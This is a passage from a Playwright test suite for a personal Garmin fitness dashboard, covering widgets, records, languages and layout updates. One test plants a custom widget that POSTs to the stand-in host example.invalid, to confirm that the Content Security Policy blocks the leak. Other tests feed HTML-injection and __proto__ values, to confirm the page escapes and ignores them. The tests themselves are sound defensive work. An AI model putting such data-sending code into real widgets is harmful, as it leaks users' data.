    const both = hikes(1, 2, 10, 20);
    const shown = await summary("2026-01-05", both);
    expect(shown).toContain("300%");
    expect(shown).toContain("last 7 days vs 4-week average");
    // the same hikes when the data starts 10 days ago: part of 4 weeks is no average
    const part = await summary("2026-10-15", both);
    expect(part).not.toContain("%");
    expect(part).not.toContain("4-week");
    // nothing in the 4 weeks before: no number, and no label that names one
    expect(await summary("2026-01-05", hikes(1))).not.toContain("4-week");
  });

  it("compares the aerobic efficiency only with 3 runs or more on both sides", async () => {
    const others = data.activities.filter((a: { sport?: string }) => a.sport !== "running");
    const sub = async (last: number) => {
      const first = [0, 1, 2].map((n) => easyRun(40_000 + n, addDays(data.start, n + 1)));
      const recent = Array.from({ length: last }, (_, n) =>
        easyRun(41_000 + n, addDays("2026-10-25", -n)),
      );
      const { page } = await open(
        browser,
        pageFile({
          data: { ...data, v: DASHBOARD_VERSION, activities: [...recent, ...first, ...others] },
        }),
        { hash: "#running" },
      );
      return {
        sub: await page.$("[data-id=aerobicFitness] .kpi-sub"),
        delta: await page.$("[data-id=aerobicFitness] .kpi-sub .delta"),
      };
    };
    // no change figure: no sub line at all, not "vs first n weeks" without a number
    expect((await sub(2)).sub).toBeNull();
    expect((await sub(3)).delta).not.toBeNull();
  });

  it("gives every sport its longest session, by distance or else by time", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: everySport(2) } }),
    );
    const longest = async (tab: string) => {
      await page.click(`[data-tab=${tab}]`);
      return page.$$eval("[data-id=records] .badge", (found) =>
        found.map((b) => [
          b.querySelector(".kpi-label")?.textContent,
          b.querySelector(".badge-value")?.textContent,
        ]),
      );
    };
    expect(await longest("running")).toEqual([["Longest session · Run", "8.0 km"]]);
    expect(await longest("walking")).toEqual([["Longest session · Walk", "3.0 km"]]);
    expect(await longest("hiking")).toEqual([["Longest session · Hike", "12.0 km"]]);
    expect(await longest("cycling")).toEqual([["Longest session · Bike", "40.0 km"]]);
    expect(await longest("swimming")).toEqual([["Longest session · Swim", "1.50 km"]]);
    // no distance: the time, on a board with its own widgets, a generic one and a strength one
    expect((await longest("racket"))[0][1]).toBe("1:00:00");
    expect((await longest("generic"))[0][1]).toBe("1:00:00");
    expect((await longest("strengthTraining"))[0][1]).toBe("1:00:00");
    // a sport without widgets of its own has the tile too
    expect((await longest("alpineSkiing"))[0]).toEqual([
      "Longest session · Alpine skiing",
      "30.0 km",
    ]);
    expect(errors).toEqual([]);
  });

  it("takes the time when a session has distance 0, and shows no record without both", async () => {
    const trek = { name: "Hike", type: "hiking", sport: "hiking", start: "2026-10-20 08:00:00" };
    const withTime = { ...trek, id: 1, km: 0, duration: "2:00:00" };
    expect(await hikeRecords([withTime])).toContain("2:00:00");
    expect(await hikeRecords([{ ...trek, id: 1 }])).toContain("No records");
  });

  it("repeats no table of its board: efforts and 1RM records are on the all board", async () => {
    const labels = async (tab: string) => {
      const { page } = await open(browser, pageFile(), { hash: tab });
      return page.$$eval("[data-id=records] .badge .kpi-label", (b) =>
        b.map((x) => x.textContent ?? ""),
      );
    };
    expect(await labels("#running")).toEqual(["Longest session · Run"]);
    const lifts = await labels("#strengthTraining");
    expect(lifts).toContain("Heaviest set");
    expect(lifts.filter((l) => l.startsWith("Best est."))).toEqual([]);
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    expect(await page.innerText("[data-id=records]")).not.toContain("1RM values");
  });

  it("cuts every list at the same length, with Show all, on every board", async () => {
    const activities = everySport(14);
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    );
    const lists = () =>
      page.$$eval("[data-id]", (found) =>
        found
          // a table of exercises is grouped and has its own search
          .filter((t) => (t as HTMLElement).dataset.id !== "exercises")
          .map((t) => {
            const items = [
              ...t.querySelectorAll(
                ":scope table.data > tbody > tr:not(.laps-row), :scope details.session",
              ),
            ] as HTMLElement[];
            return {
              id: (t as HTMLElement).dataset.id,
              all: items.length,
              shown: items.filter((r) => !r.hidden).length,
              button: t.querySelector(".btn.more")?.textContent,
            };
          })
          .filter((l) => l.all > 0),
      );
    const cut = new Set<string>();
    const boards = await page.$$eval("[data-tab]", (b) =>
      b.map((x) => (x as HTMLElement).dataset.tab),
    );
    for (const tab of boards) {
      await page.click(`[data-tab=${tab}]`);
      for (const { id, all, shown, button } of await lists()) {
        if (all > 10) cut.add(`${tab}:${id}`);
        expect([tab, id, shown]).toEqual([tab, id, Math.min(all, 10)]);
        if (all > 10) expect([tab, id, button]).toEqual([tab, id, `Show all ${all}`]);
      }
    }
    // the check above saw the lists of each sport, on the boards that have no list of their own too
    for (const list of [
      "running:activities",
      "strengthTraining:strengthSessions",
      "walking:walkDetails",
      "hiking:hikeVertical",
      "cycling:bikeDetails",
      "swimming:swimDetails",
      "racket:racketDetails",
      "alpineSkiing:activities",
      "generic:activities",
    ]) {
      expect(cut).toContain(list);
    }
    // the same button opens them: all rows, on a board with its own widget
    await page.click("[data-tab=hiking]");
    await page.click("[data-id=hikeVertical] >> text=Show all 14");
    expect(
      await page.$$eval("[data-id=hikeVertical] tbody tr:not([hidden])", (r) => r.length),
    ).toBe(14);
    expect(errors).toEqual([]);
  });

  it("gives a swim its pace per 100 m in the activity list and its laps", async () => {
    const laps = [{ lap: 1, km: 0.1, time: "1:50", kmh: 3.3, swimPace: "1:50/100 m" }];
    const { page } = await open(
      browser,
      pageFile({
        data: {
          ...data,
          v: DASHBOARD_VERSION,
          activities: [{ ...swim, pace: "20:00/km", laps }, ...data.activities],
        },
      }),
      { hash: "#swimming" },
    );
    const newest = page.locator("[data-id=activities] table.data > tbody > tr").first();
    expect(await newest.locator("td").nth(5).textContent()).toBe("2:00/100 m");
    await newest.locator(".linkish").click();
    expect(await page.textContent("[data-id=activities] .laps-row table")).toContain("1:50/100 m");
  });

  it("gives the numbers of each sport", async () => {
    const { page } = await open(browser, more(), { hash: "#hiking" });
    expect(await page.textContent("[data-id=hikeVertical]")).toContain("300 m/h");
    await page.click("[data-tab=swimming]");
    expect(await page.textContent("[data-id=swimDetails]")).toContain("2:00/100 m");
    await page.click("[data-tab=cycling]");
    expect(await page.textContent("[data-id=bikeDetails] .kpis")).toContain("3 rides");
    // 244 m in 1:09:33 of moving time
    expect(await page.innerText("[data-id=hikeVertical]")).toContain("210 m/h");
    // the whole ride counts, so the note says the route moves the number
    expect(await page.innerText("[data-id=hikeVertical]")).toContain("on the same route");
    // the ride of 2026-10-11: 327 + 1357 of 4175 zone seconds are easy, 784 + 347 hard
    const easy = (await chartDataset(page, "intensityShare", "Z1-2 (easy)")).data as number[];
    const hard = (await chartDataset(page, "intensityShare", "Z4-5 (hard)")).data as number[];
    expect(easy.filter((v) => v !== null)).toHaveLength(3);
    expect(easy.at(-4)).toBeCloseTo((1684 / 4175) * 100, 1);
    expect(hard.at(-4)).toBeCloseTo((1131 / 4175) * 100, 1);
    await page.click("[data-tab=racket]");
    // tennis and padel share the board; the sport column tells them apart
    const sports = await page.$$eval("[data-id=racketDetails] tbody tr", (r) =>
      r.map((x) => x.children[2].textContent),
    );
    // in the order of the data, where the test puts tennis first
    expect(sports).toEqual(["Tennis", "Padel", "Padel", "Padel"]);
    const numeric = await page.$$eval("[data-id=racketDetails] thead th", (th) =>
      th.map((x) => x.classList.contains("num")),
    );
    expect(numeric).toEqual([false, false, false, true, true, true, true, true, true, true, true]);
    expect(await page.textContent("[data-tab=racket] .count")).toBe("4");
    await page.click("[data-tab=walking]");
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "records",
      "steps",
      "walkDetails",
      "activities",
    ]);
  });
});

const noLoad = (a: Record<string, unknown>) => ({ ...a, trainingLoad: undefined });
const custom = (id: string, code: string) => ({ id, title: `Custom ${id}`, span: 1, code });
const on = (...ids: string[]) => ({
  rev: "c",
  base: "preset",
  seen: MET,
  boards: { all: ids.map((id) => ({ id, widget: id, span: 1 })) },
});

/** The first row of the Activities table. */
async function firstRow(file: string): Promise<string | null> {
  const { page, errors } = await open(browser, file);
  expect(errors).toEqual([]);
  return page.textContent("[data-id=activities] tbody tr");
}
/** A custom widget that shows the length and the ends of the data arrays. */
const probe = custom(
  "probe",
  "const d = ctx.data; el.textContent = [d.weeks, d.start, d.activities.length, d.activities[0].start, d.previousActivities.length, d.previousActivities[0].start, d.hrv.length, d.hrv.at(-1).date, d.recovery.length].join(' ');",
);
/** The probe tile and the first Activities row, before and after a redraw (tab switch). */
async function probed(file: string): Promise<(string | null)[]> {
  const { page, errors } = await open(browser, file);
  const read = () =>
    Promise.all([
      page.textContent("[data-id=probe] .tile-body"),
      page.textContent("[data-id=activities] tbody tr"),
    ]);
  const first = await read();
  await page.click("[role=tab] >> nth=1");
  await page.click("[data-tab=all]");
  const again = await read();
  expect(await page.$$(".tile .error")).toEqual([]);
  expect(errors).toEqual([]);
  return [...first, ...again];
}

/** A custom widget that draws a chart of `type`. */
const chartOf = (type: string) =>
  `ctx.chart(el, { type: "${type}", data: { labels: ["a", "b"], datasets: [{ data: [1, 2] }] } });`;

describe("custom widgets and languages", () => {
  it("runs a custom widget with the widget API, chart and all", async () => {
    const code = `
      const p = document.createElement("p");
      p.className = "rides";
      p.textContent = ctx.activities.filter((a) => ctx.calc.groupOf(a) === "cycling").length + " rides </script>";
      el.append(p);
      ctx.chart(el, { type: "bar", data: { labels: ["a", "b"], datasets: [{ label: "x", data: [1, 2], backgroundColor: ctx.color("cycling") }] } });`;
    const { page, errors } = await open(
      browser,
      pageFile({ widgets: [custom("rides", code)], layout: on("rides") }),
    );
    expect(await page.textContent("[data-id=rides] h2")).toBe("Custom rides");
    expect(await page.textContent(".rides")).toBe("3 rides </script>");
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("keeps the order of the data for the other tiles when a custom widget reorders it", async () => {
    const flip = custom(
      "flip",
      "ctx.data.activities.reverse(); ctx.data.previousActivities.reverse(); el.textContent = 'flipped';",
    );
    const alone = await firstRow(pageFile({ layout: on("activities") }));
    const after = await firstRow(pageFile({ widgets: [flip], layout: on("flip", "activities") }));
    expect(after).toBe(alone);
  });

  it("gives each custom widget its own data arrays, also after a redraw", async () => {
    // sorts, cuts and adds to the arrays; it still draws (the arrays are not frozen)
    const mess = custom(
      "mess",
      `const d = ctx.data;
      d.activities.sort((a, b) => (a.start < b.start ? -1 : 1));
      d.activities.splice(0, 5);
      d.activities.push(d.activities[0]);
      d.previousActivities.reverse();
      d.hrv.reverse();
      d.hrv.splice(0, 3);
      d.recovery.push({});
      el.textContent = "messed";`,
    );
    const alone = await probed(pageFile({ widgets: [probe], layout: on("probe", "activities") }));
    expect(alone[0]).toBe(
      [
        data.weeks,
        data.start,
        data.activities.length,
        data.activities[0].start,
        data.previousActivities.length,
        data.previousActivities[0].start,
        data.hrv.length,
        data.hrv.at(-1).date,
        data.recovery.length,
      ].join(" "),
    );
    const after = await probed(
      pageFile({ widgets: [mess, probe], layout: on("mess", "probe", "activities") }),
    );
    expect(after).toEqual(alone);
  });

  it("shows the texts of a custom widget in the page language, else in English", async () => {
    const texts = {
      en: { title: "Longest ride", best: "Best: {n}", only: "English only" },
      it: { title: "Uscita più lunga", best: "Migliore: {n}" },
    };
    const code = `el.textContent = ctx.text("best", { n: 42 }) + " / " + ctx.text("only");`;
    const { page, errors } = await open(
      browser,
      pageFile({
        settings: { languages: ["en", "it"] },
        widgets: [{ ...custom("ride", code), texts }],
        layout: on("ride"),
      }),
      { locale: "it-IT" },
    );
    expect(await page.textContent("[data-id=ride] h2")).toBe("Uscita più lunga");
    expect(await page.textContent("[data-id=ride] .tile-body")).toBe("Migliore: 42 / English only");
    await page.click(".account summary");
    await page.selectOption("#lang", "en");
    expect(await page.textContent("[data-id=ride] h2")).toBe("Longest ride");
    expect(errors).toEqual([]);
  });

  it("gives the notes to a custom widget as plain text", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        data: { ...data, v: DASHBOARD_VERSION, notes: ["Don&#39;t skip Z2 &amp; strides"] },
        widgets: [custom("note", "el.textContent = ctx.data.notes[0];")],
        layout: on("note"),
      }),
    );
    expect(await page.textContent("[data-id=note]")).toContain("Don't skip Z2 & strides");
    expect(errors).toEqual([]);
  });

  it("blocks a custom widget that sends data out", async () => {
    const code = `
      fetch("https://example.invalid/x", { method: "POST", body: "1" })
        .then(() => { el.textContent = "sent"; })
        .catch(() => { el.textContent = "blocked"; });`;
    const { page, errors } = await open(
      browser,
      pageFile({ widgets: [custom("leak", code)], layout: on("leak") }),
    );
    await page.waitForFunction(() =>
      document.querySelector("[data-id=leak]")?.textContent?.includes("blocked"),
    );
    expect(errors.join("\n")).toMatch(/Content Security Policy|Content-Security-Policy/);
  });

  it("shows n/a, not 0, for a load that no activity has", async () => {
    const noLoadData = {
      ...data,
      zones: null,
      activities: data.activities.map(noLoad),
      previousActivities: data.previousActivities.map(noLoad),
      v: DASHBOARD_VERSION,
      notes: [],
    };
    const { page, errors } = await open(browser, pageFile({ data: noLoadData }), {
      hash: "#running",
    });
    const load = page
      .locator(".kpi", { has: page.locator(".kpi-label", { hasText: "Garmin training load" }) })
      .first();
    expect(await load.textContent()).toContain("n/a");
    expect(errors).toEqual([]);
  });

  it("shows the error of a failing widget in its own tile only", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        widgets: [
          custom("broken", "throw new Error('no data here');"),
          custom("bad", "this is not code ("),
          custom("text", "throw 'plain text';"),
          custom("thing", "throw { code: 1 };"),
          custom("msg", "throw { message: 'no rows' };"),
          custom("long", "throw { text: 'x'.repeat(300) };"),
          custom("loop", "const o = { a: 1 }; o.self = o; throw o;"),
          custom("deep", "const a = { b: { c: null } }; a.b.c = a; throw a;"),
          custom("shared", "const s = { n: 1 }; throw { x: s, y: s };"),
          custom("longLoop", "const o = {}; o.self = o; o.t = 'x'.repeat(120); throw o;"),
          custom("big", "throw { n: 1n };"),
          custom("nothing", "throw undefined;"),
          custom("none", "throw null;"),
          custom("num", "throw { message: 5 };"),
          // {"t":"…"} is 8 characters plus the text: 100 in all fits, 101 is cut
          custom("fits", "throw { t: 'x'.repeat(92) };"),
          custom("over", "throw { t: 'x'.repeat(93) };"),
        ],
        layout: on(
          "broken",
          "bad",
          "text",
          "thing",
          "msg",
          "long",
          "loop",
          "deep",
          "shared",
          "longLoop",
          "big",
          "nothing",
          "none",
          "num",
          "fits",
          "over",
          "coachNotes",
        ),
      }),
    );
    expect(await page.textContent("[data-id=broken] .error")).toBe(
      "This widget failed: no data here",
    );
    expect(await page.textContent("[data-id=bad] .error")).toContain("This widget failed");
    // a thrown value that is not an Error still fills the placeholder
    expect(await page.textContent("[data-id=text] .error")).toBe("This widget failed: plain text");
    // an object shows its message, else a short JSON text
    expect(await page.textContent("[data-id=thing] .error")).toBe('This widget failed: {"code":1}');
    expect(await page.textContent("[data-id=msg] .error")).toBe("This widget failed: no rows");
    expect(await page.textContent("[data-id=num] .error")).toBe(
      'This widget failed: {"message":5}',
    );
    const long = (await page.textContent("[data-id=long] .error")) ?? "";
    expect(long).toMatch(/^This widget failed: \{"text":"x+…$/);
    expect(long.length - "This widget failed: ".length).toBe(100);
    expect(await page.textContent("[data-id=fits] .error")).toBe(
      `This widget failed: {"t":"${"x".repeat(92)}"}`,
    );
    expect(await page.textContent("[data-id=over] .error")).toBe(
      `This widget failed: {"t":"${"x".repeat(93)}…`,
    );
    // an object met again on its own path is a cycle; one shared by two keys is not
    expect(await page.textContent("[data-id=loop] .error")).toBe(
      'This widget failed: {"a":1,"self":"[Circular]"}',
    );
    expect(await page.textContent("[data-id=deep] .error")).toBe(
      'This widget failed: {"b":{"c":"[Circular]"}}',
    );
    expect(await page.textContent("[data-id=shared] .error")).toBe(
      'This widget failed: {"x":{"n":1},"y":{"n":1}}',
    );
    const loopStart = '{"self":"[Circular]","t":"';
    expect(await page.textContent("[data-id=longLoop] .error")).toBe(
      `This widget failed: ${loopStart}${"x".repeat(99 - loopStart.length)}…`,
    );
    // JSON cannot write a BigInt: String() is the fallback
    expect(await page.textContent("[data-id=big] .error")).toBe(
      "This widget failed: [object Object]",
    );
    expect(await page.textContent("[data-id=nothing] .error")).toBe(
      "This widget failed: undefined",
    );
    expect(await page.textContent("[data-id=none] .error")).toBe("This widget failed: null");
    expect(await page.textContent("[data-id=coachNotes] .notes")).toContain("Load");
    expect(errors).toEqual([]);
  });

  it("draws doughnut and pie charts, and shows an error for a chart type the page does not have", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        widgets: [
          custom("donut", chartOf("doughnut")),
          custom("cake", chartOf("pie")),
          custom("radar", chartOf("radar")),
        ],
        layout: on("donut", "cake", "radar"),
      }),
    );
    expect(
      await page.$$eval("[data-id=donut] canvas, [data-id=cake] canvas", (c) => c.length),
    ).toBe(2);
    expect(await page.textContent("[data-id=radar] .error")).toContain("radar");
    expect(errors).toEqual([]);
  });

  it("offers custom widgets in the catalogue", async () => {
    const { page } = await open(
      browser,
      pageFile({ widgets: [custom("mine", "el.textContent = 'mine';")], layout: on("coachNotes") }),
    );
    await startEdit(page);
    await page.click("text=Add widget");
    await page.click(".catalogue li:has-text('Custom mine') button");
    expect(await tiles(page)).toEqual(["coachNotes", "mine"]);
  });

  it("adds the languages of the page to the menu, with English for a missing text", async () => {
    const i18n = { de: { title: "Training + Erholung" }, it: { title: "Il mio allenamento" } };
    const { page } = await open(browser, pageFile({ i18n }), { locale: "it-IT" });
    // a page text replaces the built-in Italian one
    expect(await page.textContent("h1")).toBe("Il mio allenamento");
    expect(await page.$$eval("#lang option", (o) => o.map((x) => x.textContent))).toContain(
      "Deutsch",
    );
    await page.click(".account summary");
    await page.selectOption("#lang", "de");
    expect(await page.textContent("h1")).toBe("Training + Erholung");
    expect(await page.textContent("[data-id=readiness] h2")).toBe("Readiness today");
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("de");
  });
});

/** Every running preset widget but the one that a release adds: workoutTrend. */
const UNTIL_TREND = {
  running: preset("running")
    .map((i) => i.widget)
    .filter((w) => w !== "workoutTrend"),
};

const running = (rev: string, extra: object = {}) => ({
  rev,
  base: "preset",
  seen: UNTIL_TREND,
  boards: {
    running: [
      { id: "typeKpis", widget: "typeKpis", span: 3 },
      { id: "activities", widget: "activities", span: 3 },
    ],
  },
  ...extra,
});

describe("new preset widgets on edited boards", () => {
  const withWorkouts = { workouts: true };
  const openRunning = (layout: unknown, settings: object = withWorkouts) =>
    open(browser, pageFile({ layout, settings }), { hash: "#running" });

  it("shows a widget that the board has not met, full width, in its preset place", async () => {
    const { page, errors } = await openRunning(running("r0"));
    // the record lists the other widgets as met, so they stay off the board
    expect(await tiles(page)).toEqual(["typeKpis", "workoutTrend", "activities"]);
    expect(await page.getAttribute("[data-id=workoutTrend]", "class")).toContain("span-3");
    expect(errors).toEqual([]);
  });

  it("adds it to a browser layout of the same rev, with no banner", async () => {
    const file = pageFile({ layout: running("r0"), settings: withWorkouts });
    const { page } = await open(browser, file, { hash: "#running" });
    await page.evaluate(
      (seen) =>
        localStorage.setItem(
          `garmin-layout:${location.pathname}`,
          JSON.stringify({
            baseRev: "r0",
            layout: {
              base: "preset",
              seen,
              boards: { running: [{ id: "typeKpis", widget: "typeKpis", span: 3 }] },
            },
          }),
        ),
      UNTIL_TREND,
    );
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toContain("workoutTrend");
    expect(await page.$(".banner")).toBeNull();
  });

  it("adds it to both layouts of the banner", async () => {
    const { page } = await openRunning(running("r1"));
    await page.evaluate(
      (seen) =>
        localStorage.setItem(
          `garmin-layout:${location.pathname}`,
          JSON.stringify({
            baseRev: "r0",
            layout: {
              base: "preset",
              seen,
              boards: { running: [{ id: "activities", widget: "activities", span: 3 }] },
            },
          }),
        ),
      UNTIL_TREND,
    );
    await page.reload();
    await page.waitForSelector(".banner");
    expect(await tiles(page)).toContain("workoutTrend");
    await page.click(".banner >> text=Keep mine");
    expect(await tiles(page)).toContain("workoutTrend");
    expect(await saved(page)).toContain("workoutTrend");
    await page.evaluate(() => localStorage.clear());
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).toContain("workoutTrend");
  });

  it("writes nothing to the browser on load, and Done with no change saves nothing", async () => {
    const { page } = await openRunning(running("r0"));
    expect(await saved(page)).toBeNull();
    await startEdit(page);
    await page.click("text=Done");
    expect(await page.textContent("#announce")).toBe("No changes to save");
    expect(await saved(page)).toBeNull();
  });

  it("keeps a widget that you removed removed after a reload", async () => {
    const { page } = await openRunning(running("r0"));
    await startEdit(page);
    await page.click("[aria-label='Hide Workout trend']");
    await page.click(".edit-bar >> text=Add widget");
    await page.click("dialog >> text=Remove Workout trend");
    await page.click("text=Done");
    expect(await tiles(page)).not.toContain("workoutTrend");
    expect(JSON.parse((await saved(page)) ?? "null").layout.seen.running).toContain("workoutTrend");
    await page.reload();
    await page.waitForSelector(".page");
    expect(await tiles(page)).not.toContain("workoutTrend");
  });

  it("adds nothing to a blank layout or to a board that the layout does not list", async () => {
    const blank = await openRunning({ ...running("r0"), base: "blank" });
    expect(await tiles(blank.page)).toEqual(["typeKpis", "activities"]);
    const other = await open(browser, pageFile({ layout: running("r0"), settings: withWorkouts }), {
      hash: "#recovery",
    });
    expect(await tiles(other.page)).not.toContain("workoutTrend");
  });

  describe("a layout from before the record", () => {
    // records: a release added it to the preset, so it arrives; what the page left out does not
    const old = {
      base: "preset",
      boards: { running: [{ id: "typeKpis", widget: "typeKpis", span: 3 }] },
    };
    const store = (page: Page, baseRev: string) =>
      page.evaluate(
        ([rev, layout]) =>
          localStorage.setItem(
            `garmin-layout:${location.pathname}`,
            JSON.stringify({ baseRev: rev, layout }),
          ),
        [baseRev, old] as const,
      );

    it("gives the page layout nothing back that it left out", async () => {
      const { page } = await openRunning({ rev: "r0", ...old });
      expect(await tiles(page)).toEqual(["typeKpis", "records"]);
    });

    it("gives a browser layout of the same rev nothing back", async () => {
      const { page } = await openRunning(running("r0"));
      await store(page, "r0");
      await page.reload();
      await page.waitForSelector(".page");
      expect(await tiles(page)).toEqual(["typeKpis", "records"]);
    });

    it("gives the browser layout of the banner nothing back", async () => {
      const { page } = await openRunning(running("r1"));
      await store(page, "r0");
      await page.reload();
      await page.waitForSelector(".banner");
      await page.click(".banner >> text=Keep mine");
      expect(await tiles(page)).toEqual(["typeKpis", "records"]);
    });
  });

  it("opens a page whose layout lists a board named like a property of Object", async () => {
    const layout = JSON.parse(
      '{"rev":"r0","base":"preset","boards":{"constructor":[],"toString":[]}}',
    );
    const { page, errors } = await open(browser, pageFile({ layout }));
    expect(await page.$(".page")).not.toBeNull();
    expect(errors).toEqual([]);
  });

  it("does not show a widget that the page settings withhold", async () => {
    const { page } = await openRunning(running("r0"), {});
    expect(await tiles(page)).toEqual(["typeKpis", "activities"]);
  });
});

const ownCode = () => {
  const code = pageCode(readFileSync("dist/dashboard.html", "utf8"));
  if (code.from !== "template" || code.id === undefined) throw new Error("build has no page code");
  return code.id;
};

const record = (extra: object = {}) => ({
  from: "0.6.0",
  server: "0.7.0",
  code: ownCode(),
  widgets: {},
  ...extra,
});

describe("new in this version", () => {
  const note = "[role=region][aria-label='New in this version']";
  const withWorkouts = { workouts: true };

  it("shows the version, the link and a close button, and the widgets by board", async () => {
    const refresh = record({ widgets: { running: ["workoutTrend"] } });
    const { page, errors } = await open(browser, pageFile({ refresh, settings: withWorkouts }));
    const text = await page.innerText(note);
    expect(text).toContain("This page now uses version 0.7.0 of garmin-personal-mcp.");
    expect(text).toContain("New widgets on your boards:");
    expect(await page.innerText(`${note} li`)).toBe("Run: Workout trend");
    const { url } = JSON.parse(readFileSync("site/site.json", "utf8"));
    expect(await page.getAttribute(`${note} a`, "href")).toBe(`${url}whats-new.html`);
    expect(await page.$(`${note} button[class~=btn]`)).not.toBeNull();
    expect(errors).toEqual([]);
  });

  it("puts it after the late note and the layout banner", async () => {
    const layout = { rev: "r1", base: "preset", seen: MET, boards: {} };
    const file = pageFile({
      layout,
      refresh: record(),
      data: { ...data, v: DASHBOARD_VERSION, updated: hours(-26), due: hours(-2) },
    });
    const { page } = await open(browser, file);
    await page.evaluate(() =>
      localStorage.setItem(
        `garmin-layout:${location.pathname}`,
        JSON.stringify({
          baseRev: "r0",
          layout: {
            rev: "r0",
            base: "preset",
            boards: { all: [{ id: "coachNotes", widget: "coachNotes", span: 3 }] },
          },
        }),
      ),
    );
    await page.reload();
    await page.waitForSelector(".banner");
    expect(
      await page.$$eval(".banner", (els) => els.map((e) => e.getAttribute("aria-label"))),
    ).toEqual(["Refresh missed", "New layout", "New in this version"]);
  });

  it("closes for good in this browser, says so, and moves focus to the board", async () => {
    const { page, errors } = await open(browser, pageFile({ refresh: record() }));
    await page.click(`${note} button`);
    expect(await page.$(note)).toBeNull();
    expect(await page.textContent("#announce")).toBe("Note closed");
    expect(await page.evaluate(() => document.activeElement?.id)).toBe("board");
    await page.reload();
    await page.waitForSelector(".page");
    expect(await page.$(note)).toBeNull();
    expect(errors).toEqual([]);
  });

  it("shows again for a new page code, after a close for another one", async () => {
    const init = `localStorage.setItem("garmin-news:" + location.pathname, "aaaaaaaaaaaaaaaa")`;
    const { page } = await open(browser, pageFile({ refresh: record() }), { init });
    expect(await page.$(note)).not.toBeNull();
  });

  it("hides in edit mode and comes back on Done", async () => {
    const { page } = await open(browser, pageFile({ refresh: record() }));
    await startEdit(page);
    expect(await page.$(note)).toBeNull();
    await page.click("text=Done");
    expect(await page.$(note)).not.toBeNull();
  });

  it.each([
    ["no record", null],
    ["a record for other page code", { from: "n/a", server: "0.7.0", code: "aaaaaaaaaaaaaaaa" }],
  ])("shows nothing for %s", async (_name, refresh) => {
    const { page, errors } = await open(browser, pageFile({ refresh }));
    expect(await page.$(note)).toBeNull();
    expect(errors).toEqual([]);
  });

  it("shows nothing on a page with no page code id", async () => {
    const file = pageFile({ refresh: record() });
    writeFileSync(
      file,
      readFileSync(file, "utf8").replace(/<meta name="garmin-template"[^>]*>/, ""),
    );
    const { page, errors } = await open(browser, file);
    expect(await page.$(note)).toBeNull();
    expect(errors).toEqual([]);
  });

  it("works with a storage that throws, and closes for this tab", async () => {
    const init = `Object.defineProperty(window, "localStorage", { get() { throw new Error("blocked"); } })`;
    const { page, errors } = await open(browser, pageFile({ refresh: record() }), { init });
    expect(await page.$(note)).not.toBeNull();
    await page.click(`${note} button`);
    expect(await page.$(note)).toBeNull();
    await page.click("[role=tab][data-tab=running]");
    await page.click("[role=tab][data-tab=all]");
    expect(await page.$(note)).toBeNull();
    expect(errors).toEqual([]);
  });

  it("lists only the boards that the page shows", async () => {
    // the page shows All, Recovery and Bike: the running board is hidden by the settings
    const refresh = record({ widgets: { running: ["workoutTrend"], cycling: ["bikeDetails"] } });
    const { page, errors } = await open(
      browser,
      pageFile({ refresh, settings: { ...withWorkouts, sports: ["cycling"] } }),
    );
    expect(await page.$$eval(`${note} li`, (els) => els.map((e) => e.textContent))).toEqual([
      "Bike: Rides",
    ]);
    expect(errors).toEqual([]);
  });

  it("writes it in the page language, and in English where the page has no texts", async () => {
    const refresh = record({ widgets: { running: ["workoutTrend"] } });
    const italian = await open(
      browser,
      pageFile({ refresh, settings: { ...withWorkouts, languages: ["en", "it"] } }),
      { locale: "it-IT" },
    );
    expect(await italian.page.innerText(".banner li")).toBe("Corsa: Andamento degli allenamenti");
    expect(await italian.page.getAttribute(".banner", "aria-label")).toBe(
      "Novità di questa versione",
    );
    // a language that the page adds with no news texts falls back to English
    const own = await open(
      browser,
      pageFile({
        refresh,
        settings: { ...withWorkouts, languages: ["en", "xx"] },
        i18n: { xx: { title: "Xx" } },
      }),
      { locale: "xx" },
    );
    expect(await own.page.getAttribute(note, "aria-label")).toBe("New in this version");
  });

  it("shows only the text and the link when no widget is left, and no version when it is not x.y.z", async () => {
    const none = await open(browser, pageFile({ refresh: record({ server: "0.7" }) }));
    expect(await none.page.$(`${note} ul`)).toBeNull();
    expect(await none.page.innerText(`${note} p`)).toBe(
      "This page now uses a new version of garmin-personal-mcp.",
    );
    expect(await none.page.$(`${note} a`)).not.toBeNull();
  });

  it("shows names and titles as text, and survives a record of wrong types", async () => {
    const hostile = record({
      widgets: { running: ["<b>x</b>"], "<i>y</i>": ["workoutTrend"] },
    });
    const bold = { id: "ride", title: "<b>Ride</b>", span: 1, code: "el.textContent = 'x';" };
    const a = await open(
      browser,
      pageFile({ refresh: hostile, settings: withWorkouts, widgets: [bold] }),
    );
    expect(await a.page.$(`${note} b, ${note} i`)).toBeNull();
    expect(a.errors).toEqual([]);
    const viaTitle = record({ widgets: { running: ["ride"] } });
    const b = await open(browser, pageFile({ refresh: viaTitle, widgets: [bold] }));
    expect(await b.page.innerText(`${note} li`)).toBe("Run: <b>Ride</b>");
    expect(await b.page.$(`${note} b`)).toBeNull();
    for (const refresh of [
      [],
      7,
      "x",
      record({ widgets: [] }),
      JSON.parse('{"code":"' + ownCode() + '","widgets":{"__proto__":["workoutTrend"]}}'),
    ]) {
      const { page, errors } = await open(browser, pageFile({ refresh }));
      expect(errors).toEqual([]);
      expect(await page.$(".page")).not.toBeNull();
    }
  });
});

/** The test page with extra activities before the fixture's own. */
const withActivities = (extra: unknown[]) =>
  pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: [...extra, ...data.activities] } });
/** The text of the KPI widget of the Run board with extra activities. */
const runKpiText = async (activities: unknown[]) => {
  const { page } = await open(browser, withActivities(activities), { hash: "#running" });
  return page.textContent("[data-id=typeKpis]");
};
/** The tick labels of the y axis of the steps chart. */
const stepsAxis = (page: Page) =>
  page.evaluate(() => {
    const c = Object.values(window.Chart!.instances).find((x) =>
